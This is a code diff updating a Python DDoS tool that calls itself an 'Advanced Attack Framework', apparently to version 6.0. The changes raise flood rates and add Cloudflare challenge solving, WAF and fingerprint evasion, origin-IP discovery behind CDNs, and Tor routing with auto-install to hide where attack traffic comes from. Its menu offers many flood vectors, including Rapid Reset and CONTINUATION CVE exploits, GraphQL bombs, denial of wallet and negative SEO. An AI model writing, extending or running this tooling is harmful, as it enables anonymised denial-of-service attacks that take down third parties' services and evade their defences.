@@ -14,7 +14,21 @@ from datetime import datetime
 from typing import Optional, Dict, List
 from urllib.parse import urlparse
 
-# Logger goes to file only - keeps stdout clean for dashboard
+# Set UTF-8 encoding for Windows console
+if sys.platform == 'win32':
+    import codecs
+    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
+    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
+
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.layout import Layout
+from rich.text import Text
+from rich import box
+
+_RICH_CONSOLE = Console(force_terminal=True, legacy_windows=False)
+
 os.makedirs("logs", exist_ok=True)
 _LOG_FILE = f"logs/mpc_layer_{datetime.now():%Y%m%d}.log"
 logging.basicConfig(
@@ -23,7 +37,6 @@ logging.basicConfig(
     handlers=[logging.FileHandler(_LOG_FILE, encoding="utf-8")],
     force=True,
 )
-# Silence noisy submodules during dashboard
 for _name in ("enhanced_attack", "attack_engine", "proxy_engine", "target_detector",
               "origin_hunter", "proxy_harvester", "mpc_layer"):
     logging.getLogger(_name).setLevel(logging.ERROR)
@@ -32,17 +45,106 @@ logger = logging.getLogger("mpc_layer")
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-VERSION = "5.0"
+VERSION = "6.0"
 GO_ENGINE = "bin/go_engine.exe"
 RAPID_RESET_BIN = "bin/rapid_reset.exe"
+
+# Global bypass feature flags (loaded from env)
+BYPASS_FLAGS = {}
+
+def _rich_sep():
+    """Print a Rich separator line."""
+    _RICH_CONSOLE.rule(style="dim cyan")
+
+def _rich_header(title: str, subtitle: str = ""):
+    """Print a Rich panel header."""
+    _RICH_CONSOLE.print()
+    content = f"[bold cyan]{title}[/]"
+    if subtitle:
+        content += f"\n[white]{subtitle}[/]"
+    _RICH_CONSOLE.print(Panel(content, border_style="cyan", box=box.HEAVY))
+
+def check_flaresolverr():
+    """Auto-detect FlareSolverr service. Returns (available: bool, endpoint: str)."""
+    endpoint = os.environ.get("FLARESOLVERR_ENDPOINT", "http://localhost:8191")
+    try:
+        from urllib.request import Request, urlopen
+        req = Request(f"{endpoint}/v1", data=b'{"cmd":"sessions.list"}',
+                      headers={"Content-Type": "application/json"}, method="POST")
+        with urlopen(req, timeout=3) as resp:
+            if resp.status == 200:
+                print(f" {c('g','[+]')} FlareSolverr detected: {endpoint}")
+                return True, endpoint
+    except Exception:
+        pass
+    # Try to auto-start via docker-compose
+    compose_path = "docker-compose.yml"
+    if os.path.exists(compose_path):
+        try:
+            print(f" {c('y','[*]')} FlareSolverr not running. Attempting auto-start via docker-compose...")
+            subprocess.run(
+                ["docker-compose", "up", "-d", "flaresolverr"],
+                capture_output=True, timeout=30, check=False
+            )
+            import time as _t
+            _t.sleep(5)
+            with urlopen(req, timeout=5) as resp:
+                if resp.status == 200:
+                    print(f" {c('g','[+]')} FlareSolverr started successfully: {endpoint}")
+                    return True, endpoint
+        except Exception as e:
+            print(f" {c('y','[!]')} Auto-start failed: {e}")
+    print(f" {c('y','[!]')} FlareSolverr not available.")
+    print(f" {c('c','[*]')} Install with: docker run -d -p 8191:8191 ghcr.io/flaresolverr/flaresolverr")
+    fs_choice = input(f" {c('c','[*]')} Have FlareSolverr running elsewhere? Enter endpoint URL (or press Enter to skip): ").strip()
+    if fs_choice:
+        try:
+            ep = fs_choice if fs_choice.startswith("http") else f"http://{fs_choice}"
+            req2 = Request(f"{ep}/v1", data=b'{"cmd":"sessions.list"}',
+                          headers={"Content-Type": "application/json"}, method="POST")
+            with urlopen(req2, timeout=5) as resp2:
+                if resp2.status == 200:
+                    print(f" {c('g','[+]')} FlareSolverr connected: {ep}")
+                    return True, ep
+        except Exception:
+            print(f" {c('y','[!]')} Could not connect to {fs_choice}")
+    return False, endpoint
+
+def load_bypass_flags(env: dict = None) -> dict:
+    """Load bypass feature flags from env."""
+    if env is None:
+        env = load_env()
+    flags = {
+        "http2_impersonation": env.get("USE_HTTP2_IMPERSONATION", "1") == "1",
+        "waf_parsing_bypass": env.get("USE_WAF_PARSING_BYPASS", "1") == "1",
+        "behavioral_evasion": env.get("USE_BEHAVIORAL_EVASION", "1") == "1",
+        "flaresolverr": env.get("USE_FLARESOLVERR", "1") == "1",
+        "origin_discovery": env.get("USE_ORIGIN_DISCOVERY", "1") == "1",
+        "browser_pool": env.get("USE_BROWSER_POOL", "1") == "1",
+    }
+    return flags
 
 def load_config(path: str = "config/default.yaml") -> dict:
     d = {
         "proxy": {"connect_timeout": 3, "min_pool": 5, "health_check_interval": 60, "max_fail": 3},
-        "attack": {"default_duration": 300, "default_method": "http_get_flood", "max_rps": 10000, "min_rps": 10, "initial_rps": 1000},
+        "attack": {"default_duration": 300, "default_method": "http_get_flood", "max_rps": 50000, "min_rps": 100, "initial_rps": 5000},
+        "http2": {"enabled": True, "default_profile": "chrome126", "profile_rotation": 50},
+        "waf_bypass": {"enabled": True, "auto_probe": True, "probe_methods": 10, "effectiveness_threshold": 0.5},
+        "behavioral": {"enabled": True, "browser_mode": "nodriver", "browser_pool": {"max_concurrent": 10, "recycle_after": 1000, "session_ttl": 600}},
+        "flaresolverr": {"enabled": True, "endpoint": "http://localhost:8191", "timeout": 30, "auto_start": True},
+        "origin_discovery": {"enabled": True, "timeout": 8, "max_concurrent": 200},
+        "session_pool": {"enabled": True, "max_sessions": 100, "cookie_db": "cookies/sessions.db"},
     }
     try:
         with open(path) as f:
+            loaded = yaml.safe_load(f)
+            if loaded:
+                _merge(d, loaded)
+    except Exception:
+        pass
+    # Also load settings.yaml if it exists
+    try:
+        with open("config/settings.yaml") as f:
             loaded = yaml.safe_load(f)
             if loaded:
                 _merge(d, loaded)
@@ -75,51 +177,93 @@ def c(t, s):
     return f"\033[1;{codes.get(t, '37')}m{s}\033[0m"
 
 def banner():
-    print()
-    print(c("w", "=" * 70))
-    print(f"  {c('w','Multi-Protocol Concurrency Layer')} {c('d','v' + VERSION + ' [2026]')}")
-    print(f"  {c('d','Asynchronous Attack Vector Engine | Transport Layer Optimization')}")
-    print(c("w", "=" * 70))
-    print()
+    # ASCII Art "LAYER 7 ATTACK" - Professional
+    ascii_art = """
+[bold red]  ▒█████   ▓██   ██▓ ▓█████  ███▄    █      ▓█████  ██▀███   ██▀███   ▒█████   ██▀███  [/]
+[bold dark_orange] ▒██▒  ██▒  ▒██  ██▒ ▓█   ▀  ██ ▀█   █      ▓█   ▀ ▓██ ▒ ██▒▓██ ▒ ██▒▒██▒  ██▒▓██ ▒ ██▒[/]
+[bold yellow] ▒██░  ██▒   ▒██ ██░ ▒███   ▓██  ▀█ ██▒     ▒███   ▓██ ░▄█ ▒▓██ ░▄█ ▒▒██░  ██▒▓██ ░▄█ ▒[/]
+[bold green] ▒██   ██░   ░ ▐██▓░ ▒▓█  ▄ ▓██▒  ▐▌██▒     ▒▓█  ▄ ▒██▀▀█▄  ▒██▀▀█▄  ▒██   ██░▒██▀▀█▄  [/]
+[bold cyan] ░ ████▓▒░   ░ ██▒▓░ ░▒████▒▒██░   ▓██░     ░▒████▒░██▓ ▒██▒░██▓ ▒██▒░ ████▓▒░░██▓ ▒██▒[/]
+[bold dodger_blue2] ░ ▒░▒░▒░     ██▒▒▒  ░░ ▒░ ░░ ▒░   ▒ ▒      ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░[/]
+[bold magenta]   ░ ▒ ▒░   ▓██ ░▒░   ░ ░  ░░ ░░   ░ ▒░      ░ ░  ░  ░▒ ░ ▒░  ░▒ ░ ▒░  ░ ▒ ▒░   ░▒ ░ ▒░[/]
+[bold purple] ░ ░ ░ ▒    ▒ ▒ ░░      ░      ░   ░ ░         ░     ░░   ░   ░░   ░ ░ ░ ░ ▒    ░░   ░[/]
+"""
+    _RICH_CONSOLE.print(ascii_art)
+    
+    header = f'[bold white]Multi-Protocol Concurrency Layer[/] | [bold cyan]Advanced Attack Framework[/] [bold yellow]v{VERSION}[/]'
+    _RICH_CONSOLE.print(header)
+    separator = "[dim white]" + ("─" * 98) + "[/]"
+    _RICH_CONSOLE.print(separator)
+    _RICH_CONSOLE.print()
 
 def menu():
     banner()
-    print(f"  {c('c','[1]')} HTTP Flood      {c('d','Layer 7 smart endpoint flood')}")
-    print(f"  {c('c','[2]')} HTTP/2 Flood    {c('d','HTTP/2 multiplexing attack')}")
-    print(f"  {c('c','[3]')} Rapid Reset     {c('d','CVE-2023-44487 stream reset')}")
-    print(f"  {c('c','[4]')} Slowloris       {c('d','Slow header exhaustion')}")
-    print(f"  {c('c','[5]')} Proxy Flood     {c('d','Rotating proxy attack')}")
-    print(f"  {c('c','[6]')} SYN Flood       {c('d','Layer 4 TCP SYN flood')}")
-    print(f"  {c('c','[7]')} UDP Flood       {c('d','Layer 4 UDP flood')}")
-    print()
-    print(f"  {c('m','[A]')} Cache-Bypass    {c('d','Hit origin, skip CDN cache')}")
-    print(f"  {c('m','[B]')} Smuggling       {c('d','HTTP request smuggling')}")
-    print(f"  {c('m','[C]')} HPACK Bomb      {c('d','HTTP/2 header compression')}")
-    print(f"  {c('m','[D]')} Continuation    {c('d','CVE-2024-27316 H2 flood')}")
-    print(f"  {c('m','[E]')} Settings        {c('d','HTTP/2 settings spam')}")
-    print(f"  {c('m','[F]')} TLS Reneg       {c('d','TLS renegotiation burn')}")
-    print(f"  {c('m','[G]')} POST Bomb       {c('d','50MB multipart upload')}")
-    print(f"  {c('m','[I]')} WebSocket       {c('d','WS connection storm')}")
-    print(f"  {c('m','[J]')} Conn Storm      {c('d','TCP connection hold')}")
-    print()
-    print(f"  {c('r','[Q]')} HTTP/3 Hijack   {c('d','QUIC stream manipulation')}")
-    print(f"  {c('r','[R]')} QUIC CID        {c('d','Connection ID table flood')}")
-    print(f"  {c('r','[S]')} QUIC Crypto     {c('d','Handshake CPU exhaustion')}")
-    print()
-    print(f"  {c('b','[T]')} REST API        {c('d','CRUD endpoint flood')}")
-    print(f"  {c('b','[U]')} GraphQL         {c('d','Deep nested query bomb')}")
-    print(f"  {c('b','[V]')} GraphQL Alias   {c('d','200-alias query bomb')}")
-    print(f"  {c('b','[W]')} gRPC            {c('d','HTTP/2 gRPC flood')}")
-    print(f"  {c('b','[X]')} JSON/XML        {c('d','Parsing bomb attack')}")
-    print(f"  {c('b','[Y]')} Cold Start      {c('d','Serverless auto-scale')}")
-    print(f"  {c('b','[Z]')} Cost Acc        {c('d','Denial of Wallet')}")
-    print()
-    print(f"  {c('g','[8]')} Mixed Attack    {c('d','ALL 26 vectors parallel')}")
-    print(f"  {c('g','[9]')} Auto Mode       {c('d','5-phase adaptive attack')}")
-    print(f"  {c('g','[H]')} Origin Hunt     {c('d','Find IP behind CDN')}")
-    print(f"  {c('g','[P]')} Harvest Proxy   {c('d','Auto-scrape 24k+ proxies')}")
-    print(f"  {c('c','[0]')} Dashboard       {c('d','Web monitoring panel')}")
-    print()
+    
+    menu_text = """
+  [bold magenta]LAYER 7 & 4 VECTORS[/]                                 [bold magenta]ADVANCED EVASION[/]
+  [bold yellow][1][/] [bold white]HTTP Flood[/]      [dim white]Layer 7 smart endpoint flood[/]      [bold yellow][A][/] [bold white]Cache-Bypass[/]    [dim white]Hit origin, skip CDN cache[/]
+  [bold yellow][2][/] [bold white]HTTP/2 Flood[/]    [dim white]HTTP/2 multiplexing attack[/]        [bold yellow][B][/] [bold white]Smuggling[/]       [dim white]HTTP request smuggling[/]
+  [bold yellow][3][/] [bold white]Rapid Reset[/]     [dim white]CVE-2023-44487 stream reset[/]       [bold yellow][C][/] [bold white]HPACK Bomb[/]      [dim white]HTTP/2 header compression[/]
+  [bold yellow][4][/] [bold white]Slowloris[/]       [dim white]Slow header exhaustion[/]            [bold yellow][D][/] [bold white]Continuation[/]    [dim white]CVE-2024-27316 H2 flood[/]
+  [bold yellow][5][/] [bold white]Proxy Flood[/]     [dim white]Rotating proxy attack[/]             [bold yellow][E][/] [bold white]Settings[/]        [dim white]HTTP/2 settings spam[/]
+  [bold yellow][6][/] [bold white]SYN Flood[/]       [dim white]Layer 4 TCP SYN flood[/]             [bold yellow][F][/] [bold white]TLS Reneg[/]       [dim white]TLS renegotiation burn[/]
+  [bold yellow][7][/] [bold white]UDP Flood[/]       [dim white]Layer 4 UDP flood[/]                 [bold yellow][G][/] [bold white]POST Bomb[/]       [dim white]50MB multipart upload[/]
+
+  [bold magenta]QUIC & WEBSOCKET[/]                                    [bold magenta]API & LOGIC BOMBS[/]
+  [bold yellow][Q][/] [bold white]HTTP/3 Hijack[/]   [dim white]QUIC stream manipulation[/]          [bold yellow][T][/] [bold white]REST API[/]        [dim white]CRUD endpoint flood[/]
+  [bold yellow][R][/] [bold white]QUIC CID[/]        [dim white]Connection ID table flood[/]         [bold yellow][U][/] [bold white]GraphQL[/]         [dim white]Deep nested query bomb[/]
+  [bold yellow][S][/] [bold white]QUIC Crypto[/]     [dim white]Handshake CPU exhaustion[/]          [bold yellow][V][/] [bold white]GraphQL Alias[/]   [dim white]200-alias query bomb[/]
+  [bold yellow][I][/] [bold white]WebSocket[/]       [dim white]WS connection storm[/]               [bold yellow][W][/] [bold white]gRPC[/]            [dim white]HTTP/2 gRPC flood[/]
+  [bold yellow][J][/] [bold white]Conn Storm[/]      [dim white]TCP connection hold[/]               [bold yellow][X][/] [bold white]JSON/XML[/]        [dim white]Parsing bomb attack[/]
+
+  [bold magenta]AUTOMATION & UTILITIES[/]                              [bold magenta]SYSTEM & OTHERS[/]
+  [bold yellow][8][/] [bold white]Mixed Attack[/]    [dim white]ALL 26 vectors parallel[/]           [bold yellow][Y][/] [bold white]Cold Start[/]      [dim white]Serverless auto-scale[/]
+  [bold yellow][9][/] [bold white]Auto Mode[/]       [dim white]AI-driven adaptive bypass[/]         [bold yellow][Z][/] [bold white]Cost Acc[/]        [dim white]Denial of Wallet[/]
+  [bold yellow][N][/] [bold white]Advanced 2026[/]   [dim white]Behavioral + Fingerprint[/]          [bold yellow][K][/] [bold white]SEO Attack[/]      [dim white]Negative SEO manipulation[/]
+  [bold yellow][H][/] [bold white]Origin Hunt[/]     [dim white]Find IP behind CDN[/]                [bold yellow][L][/] [bold white]Business Logic[/]  [dim white]Low-slow resource drain[/]
+  [bold yellow][P][/] [bold white]Harvest Proxy[/]   [dim white]Auto-scrape 24k+ proxies[/]          [bold yellow][M][/] [bold white]Bypass Config[/]   [dim white]Toggle evasion modules[/]
+  [bold yellow][0][/] [bold white]Dashboard[/]       [dim white]Web monitoring panel[/]
+
+[dim white]──────────────────────────────────────────────────────────────────────────────────────────────────[/]"""
+    
+    _RICH_CONSOLE.print(menu_text)
+
+# =====================================================================
+# TOGGLE BYPASS FEATURES
+# =====================================================================
+def toggle_bypass_features():
+    """Interactive toggling of bypass feature flags."""
+    global BYPASS_FLAGS
+    feature_names = {
+        "1": ("HTTP/2 Impersonation", "http2_impersonation"),
+        "2": ("WAF Parsing Bypass", "waf_parsing_bypass"),
+        "3": ("Behavioral Evasion", "behavioral_evasion"),
+        "4": ("FlareSolverr", "flaresolverr"),
+        "5": ("Origin Discovery", "origin_discovery"),
+        "6": ("Browser Pool", "browser_pool"),
+    }
+    while True:
+        table = Table(title="BYPASS MODULE TOGGLES", box=box.HEAVY_EDGE, border_style="cyan",
+                      show_header=True, header_style="bold white on grey15")
+        table.add_column("Key", justify="center", width=6)
+        table.add_column("Module", ratio=2)
+        table.add_column("Status", justify="center", width=10)
+        for key, (name, flag) in feature_names.items():
+            status = "[bold green]ON[/]" if BYPASS_FLAGS.get(flag, True) else "[bold red]OFF[/]"
+            table.add_row(f"[cyan]{key}[/]", name, status)
+        table.add_row("", "", "")
+        table.add_row("[cyan]0[/]", "[bold]Back to Main Menu[/]", "")
+        _RICH_CONSOLE.print(table)
+        ch = get_input(" [bold]Toggle module [1-6] or 0 to exit:[/] ").strip()
+        if ch == "0":
+            break
+        if ch in feature_names:
+            name, flag = feature_names[ch]
+            BYPASS_FLAGS[flag] = not BYPASS_FLAGS.get(flag, True)
+            status = "[green]ENABLED[/]" if BYPASS_FLAGS[flag] else "[red]DISABLED[/]"
+            _RICH_CONSOLE.print(f"  [bold green][+][/] {name}: {status}")
+        else:
+            _RICH_CONSOLE.print(f"  [bold red][-][/] Invalid option")
 
 def get_input(prompt: str) -> str:
     try:
@@ -347,7 +491,7 @@ async def smart_layer7_attack(target: str, duration: int, rps: int,
             use_rapid_reset = True
 
     print(f" {c('g','[+]')} Final attack plan: method={c('w',chosen_method)} strategy={c('w',chosen_strategy)}")
-    print(f" {c('m','=' * 70)}")
+    _rich_sep()
 
     proxy_pool = None
     if use_proxy and proxy_file:
@@ -485,13 +629,14 @@ async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin:
                 if f.endswith(".txt") and not f.startswith(".")
             ])
 
-        smart_default = "1" if proxy_files else "3"
+        smart_default = "1" if proxy_files else "4"
 
         print(f"\n {c('c','[*]')} Proxy for ATTACK traffic (not for recon):")
         print(f"   {c('c','1.')} Use existing proxy file(s)" + (f" {c('g','['+str(len(proxy_files))+' files found]')}" if proxy_files else ""))
         print(f"   {c('c','2.')} Auto-harvest fresh proxies first")
-        print(f"   {c('c','3.')} No proxies (direct attack)")
-        proxy_choice = get_input(f" Choose [1/2/3] (default {smart_default}): ").strip() or smart_default
+        print(f"   {c('c','3.')} Use Tor network (SOCKS5, auto-install)")
+        print(f"   {c('c','4.')} No proxies (direct attack)")
+        proxy_choice = get_input(f" Choose [1/2/3/4] (default {smart_default}): ").strip() or smart_default
 
         if proxy_choice == "1":
             if proxy_files:
@@ -632,7 +777,63 @@ async def prompt_attack_options(target: str, ask_proxy: bool = True, ask_origin:
                 options["proxy_file"] = save_path
             else:
                 print(f" {c('y','[!]')} No fast proxies harvested - attack will go direct")
-        # else (option 3 or anything else) = no proxies
+        elif proxy_choice == "3":
+            # Tor network
+            print(f"\n {c('c','[*]')} Setting up Tor network...")
+            try:
+                from core.network.tor_manager import get_tor_manager
+                from core.network.proxy import ProxyPool
+
+                # Ask number of instances
+                tor_instances = get_input(" Tor instances [1-20] (default 5): ").strip() or "5"
+                tor_instances = max(1, min(20, int(tor_instances)))
+
+                # Setup Tor
+                manager = get_tor_manager(instances=tor_instances)
+
+                if not manager.is_tor_installed():
+                    if get_input(" Tor not installed. Install now? (Y/n): ").lower() != "n":
+                        print(f" {c('c','[*]')} Auto-installing Tor...")
+                        if not manager.install_tor():
+                            print(f" {c('r','[-]')} Tor installation failed")
+                        else:
+                            print(f" {c('g','[+]')} Tor installed successfully")
+                    else:
+                        print(f" {c('y','[!]')} Tor not available - attack will go direct")
+
+                if manager.is_tor_installed():
+                    manager.setup_instances()
+                    success = manager.start_all(wait_bootstrap=False)
+                    if success > 0:
+                        print(f" {c('g','[+]')} Started {success}/{tor_instances} Tor instances")
+                        print(f" {c('c','[*]')} Waiting for Tor bootstrap (up to 120s)...")
+                        # Non-blocking bootstrap wait
+                        bootstrapped = [False] * len(manager.instances)
+                        for _ in range(120):
+                            for idx, inst in enumerate(manager.instances):
+                                if not bootstrapped[idx] and inst.pid:
+                                    if manager.wait_for_bootstrap(inst, timeout=3):
+                                        bootstrapped[idx] = True
+                            if all(bootstrapped):
+                                break
+                            await asyncio.sleep(1)
+                        health = await manager.check_all_health()
+                        healthy = [h for h in health if h.get('is_tor')]
+                        print(f" {c('g','[+]')} {len(healthy)}/{tor_instances} Tor instances healthy")
+                        for h in healthy:
+                            print(f"    Tor#{h['instance_id']} {h['exit_ip']}")
+
+                    if healthy:
+                        from core.network.tor_manager import TOR_BASE_SOCKS_PORT
+                        from core.network.proxy import ProxyPool
+                        proxy_pool = ProxyPool(connect_timeout=10)
+                        for h in healthy:
+                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
+                            proxy_pool._pending.append(f"socks5://127.0.0.1:{socks_port}")
+                        print(f" {c('g','[+]')} Tor ready: {len(healthy)} instances")
+            except Exception as e:
+                print(f" {c('r','[-]')} Tor setup error: {e}")
+        # else (option 4 or anything else) = no proxies
 
     return options
 
@@ -652,7 +853,7 @@ async def run_http_flood(target: str, cfg: dict):
         print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
     if opts["proxy_pool"]:
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
-    print(f" {c('m','=' * 70)}")
+    _rich_sep()
 
     from core.attack.enhanced import run_enhanced_attack
 
@@ -738,7 +939,7 @@ async def run_http2_flood(target: str, cfg: dict):
     if opts["proxy_pool"]:
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
     print(f" {c('c','[*]')} Engine: {'Python (slow target)' if use_python else 'Go (fast)'}")
-    print(f" {c('m','=' * 70)}")
+    _rich_sep()
 
     # Create single vector with live dashboard
     vectors = []
@@ -849,7 +1050,7 @@ async def run_rapid_reset(target: str, cfg: dict):
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
     print(f" {c('y','[!]')} Low bandwidth, high server CPU impact")
     print(f" {c('c','[*]')} Engine: {'Python (slow target fallback)' if use_python else 'Go (fast)'}")
-    print(f" {c('m','=' * 70)}")
+    _rich_sep()
 
     # Create single vector with live dashboard
     vectors = []
@@ -933,7 +1134,7 @@ async def run_slowloris(target: str, cfg: dict):
         print(f" {c('g','[+]')} Hitting origin: {opts['origin_ip']}")
     if opts["proxy_pool"]:
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
-    print(f" {c('m','=' * 70)}")
+    _rich_sep()
 
     # Create single vector with live dashboard
     vectors = []
@@ -968,36 +1169,72 @@ async def run_slowloris(target: str, cfg: dict):
 async def run_proxy_flood(target: str, cfg: dict):
     duration = int(get_input(" Duration (seconds, default 60): ") or "60")
     rps = int(get_input(" Target RPS (default 500): ") or "500")
-    proxy_file = get_input(" Proxy file (default proxies/http.txt): ") or "proxies/http.txt"
-
-    print(f"\n {c('c','[*]')} Proxy Flood | {target} | {duration}s | {rps} RPS")
-    print(f" {c('c','[*]')} Proxy file: {proxy_file}")
-    print(f" {c('m','=' * 70)}")
-
+    
+    # Proxy selection with Tor support
+    print(f"\n {c('c','[*]')} Proxy for Proxy Flood:")
+    print(f"   {c('c','[1]')} Load from proxy file")
+    print(f"   {c('c','[2]')} Use Tor network (SOCKS5)")
+    proxy_sel = get_input(" Choose [1/2] (default 1): ").strip() or "1"
+    
     from core.network.proxy import ProxyPool
     from core.attack.enhanced import run_enhanced_attack
+    
+    proxy_pool = None
+    
+    if proxy_sel == "2":
+        # Tor
+        print(f"\n {c('c','[*]')} Setting up Tor network...")
+        try:
+            from core.network.tor_manager import get_tor_manager
+            tor_instances = int(get_input(" Tor instances [1-20] (default 5): ") or "5")
+            tor_instances = max(1, min(20, tor_instances))
+            manager = get_tor_manager(instances=tor_instances)
+            if not manager.is_tor_installed():
+                if get_input(" Tor not installed. Install now? (Y/n): ").lower() != "n":
+                    manager.install_tor()
+            if manager.is_tor_installed():
+                manager.setup_instances()
+                success = manager.start_all()
+                if success > 0:
+                    await asyncio.sleep(10)
+                    health = await manager.check_all_health()
+                    healthy = [h for h in health if h.get('is_tor')]
+                    if healthy:
+                        proxy_pool = ProxyPool(connect_timeout=10)
+                        for h in healthy:
+                            from core.network.tor_manager import TOR_BASE_SOCKS_PORT
+                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
+                            proxy_pool._pending.append(f"socks5://127.0.0.1:{socks_port}")
+                        print(f" {c('g','[+]')} Tor ready: {len(healthy)} instances")
+        except Exception as e:
+            print(f" {c('r','[-]')} Tor setup failed: {e}")
+    
+    if proxy_pool is None:
+        proxy_file = get_input(" Proxy file (default proxies/http.txt): ") or "proxies/http.txt"
+        print(f" {c('c','[*]')} Proxy file: {proxy_file}")
+        proxy_pool = ProxyPool(connect_timeout=5, min_pool=cfg["proxy"]["min_pool"])
+        total = await proxy_pool.load_file(proxy_file)
+        if total == 0:
+            print(f" {c('r','[-]')} No proxies loaded from {proxy_file}")
+            return
+        proxy_pool._validator.set_target(target)
+        print(f" {c('c','[*]')} Validating {total} proxies...")
+        alive = await proxy_pool.quick_validate(total, concurrency=40)
+        if alive == 0:
+            print(f" {c('r','[-]')} No valid proxies found")
+            return
+        print(f" {c('g','[+]')} {alive} proxies alive")
 
-    proxy_pool = ProxyPool(connect_timeout=5, min_pool=cfg["proxy"]["min_pool"])
-    total = await proxy_pool.load_file(proxy_file)
-    if total == 0:
-        print(f" {c('r','[-]')} No proxies loaded from {proxy_file}")
-        return
-
-    proxy_pool._validator.set_target(target)
-    print(f" {c('c','[*]')} Validating {total} proxies...")
-    alive = await proxy_pool.quick_validate(total, concurrency=40)
-    if alive == 0:
-        print(f" {c('r','[-]')} No valid proxies found")
-        return
-    print(f" {c('g','[+]')} {alive} proxies alive")
-
+    print(f"\n {c('c','[*]')} Proxy Flood | {target} | {duration}s | {rps} RPS")
+    _rich_sep()
+    
     health_task = asyncio.create_task(proxy_pool.health_loop())
-
+    
     result = await run_enhanced_attack(
         url=target, duration=duration, method="http_get_flood",
         rps=rps, proxy_pool=proxy_pool
     )
-
+    
     health_task.cancel()
     print_attack_summary(target, duration, result)
 
@@ -1021,7 +1258,7 @@ async def run_syn_flood(target: str, cfg: dict):
     print(f"\n {c('c','[*]')} TCP SYN Flood | {target} | {duration}s | {rps} PPS")
     if opts["origin_ip"]:
         print(f" {c('g','[+]')} Origin IP: {opts['origin_ip']}")
-    print(f" {c('m','=' * 70)}")
+    _rich_sep()
 
     # Create single vector with live dashboard
     vectors = []
@@ -1072,7 +1309,7 @@ async def run_udp_flood(target: str, cfg: dict):
     print(f"\n {c('c','[*]')} UDP Flood | {target} | {duration}s | {rps} PPS")
     if opts["origin_ip"]:
         print(f" {c('g','[+]')} Origin IP: {opts['origin_ip']}")
-    print(f" {c('m','=' * 70)}")
+    _rich_sep()
 
     # Create single vector with live dashboard
     vectors = []
@@ -1179,7 +1416,7 @@ async def run_mixed_attack(target: str, cfg: dict):
         except Exception:
             pass
 
-    print(f"\n {c('w','='*78)}")
+    _rich_sep()
     print(f" {c('w','MIXED ATTACK - ALL VECTORS')}  Target: {c('c', target)}  Duration: {duration}s")
     if primary_origin:
         print(f" Origin bypass: {c('g', primary_origin)}")
@@ -1188,7 +1425,7 @@ async def run_mixed_attack(target: str, cfg: dict):
     if profile:
         print(f" Profile: HTTP/2={'YES' if profile.supports_http2 else 'NO'}  Server={profile.server}")
     print(f" Connection: {c(tier_color, safe_caps['tier'])}  Max RPS: {rps}  Threads/vec: {max_threads}")
-    print(f" {c('w','='*78)}\n")
+    _rich_sep()
 
     vectors = []
     tasks = []
@@ -1420,23 +1657,53 @@ async def run_mixed_attack(target: str, cfg: dict):
 
 async def run_auto_mode(target: str, cfg: dict):
     """
-    Auto Mode entry point.
+    Auto Mode entry point with integrated bypass modules.
     
-    Routes to v2 (raw HTTP/1.1 + thread isolation + 5-phase ladder) by default.
-    Falls back to legacy implementation if v2 fails to import.
+    Features:
+    - FlareSolverr auto-detection (solves Cloudflare challenges)
+    - HTTP/2 fingerprint impersonation
+    - WAF parsing bypass probing
+    - Behavioral evasion with browser pool
+    - Origin discovery with 18 sources
     """
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
     
-    print(f"\n {c('w','='*70)}")
-    print(f" {c('w','  AUTO MODE V2 - 5-PHASE ADAPTIVE (RAW HTTP/1.1)')}")
-    print(f" {c('w','='*70)}\n")
+    env = load_env()
+    bypass = load_bypass_flags(env)
+    
+    _RICH_CONSOLE.print()
+    _RICH_CONSOLE.print(Panel("[bold cyan]AUTO MODE V2 - SMART BYPASS INTEGRATION[/]", 
+                               border_style="cyan", box=box.HEAVY))
+    
+    # Show active bypass features
+    active = [k for k, v in bypass.items() if v]
+    inactive = [k for k, v in bypass.items() if not v]
+    if active:
+        _RICH_CONSOLE.print(f"[bold green][+][/] Active bypass: [white]{', '.join(active)}[/]")
+    if inactive:
+        _RICH_CONSOLE.print(f"[bold yellow][!][/] Disabled bypass: [dim]{', '.join(inactive)}[/]")
+    
+    # ============== PHASE 0: FLARESOLVERR AUTO-DETECT ==============
+    flaresolverr_ok = False
+    if bypass.get("flaresolverr", True) and cfg.get("flaresolverr", {}).get("enabled", True):
+        _RICH_CONSOLE.print()
+        _RICH_CONSOLE.print("[bold cyan][*][/] Phase 0: FlareSolverr Auto-Detection")
+        flaresolverr_ok, fs_endpoint = check_flaresolverr()
+        if flaresolverr_ok:
+            _RICH_CONSOLE.print("[bold green][+][/] Cloudflare challenges will be solved automatically")
+            # Initialize FlareSolverr client
+            try:
+                from core.network.flaresolverr_client import flaresolverr_client
+                flaresolverr_client._endpoint = fs_endpoint
+                flaresolverr_client.start()
+            except Exception as e:
+                _RICH_CONSOLE.print(f"[bold yellow][!][/] FlareSolverr init error: {e}")
     
     duration = int(get_input(" Duration (seconds, default 120): ") or "120")
     target_rps = int(get_input(" Target RPS (default 2000): ") or "2000")
     
-    # Optional proxy pool from common prompt (proxy currently informational - raw engine
-    # uses direct connection; proxy hint kept for future raw engine proxy support)
+    # Optional proxy pool
     use_proxy_prompt = get_input(" Use proxy pool? (y/N): ").strip().lower() == "y"
     proxy_pool = None
     if use_proxy_prompt:
@@ -1444,17 +1711,82 @@ async def run_auto_mode(target: str, cfg: dict):
             opts = await prompt_attack_options(target, ask_proxy=True, ask_origin=False)
             proxy_pool = opts.get("proxy_pool")
         except Exception as e:
-            print(f" {c('y','[!]')} proxy setup failed: {e}")
-            proxy_pool = None
+            _RICH_CONSOLE.print(f"[bold yellow][!][/] proxy setup failed: {e}")
     
